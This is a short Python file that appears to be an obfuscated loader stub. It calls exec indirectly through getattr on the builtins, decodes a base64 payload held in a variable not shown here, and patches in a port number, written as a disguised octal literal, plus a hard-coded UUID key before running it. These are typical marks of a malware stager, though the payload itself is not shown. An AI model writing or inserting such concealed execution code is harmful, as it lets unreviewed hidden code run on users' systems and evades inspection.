import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "9151c7c0-31d1-4c75-a14c-54f519b32662")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)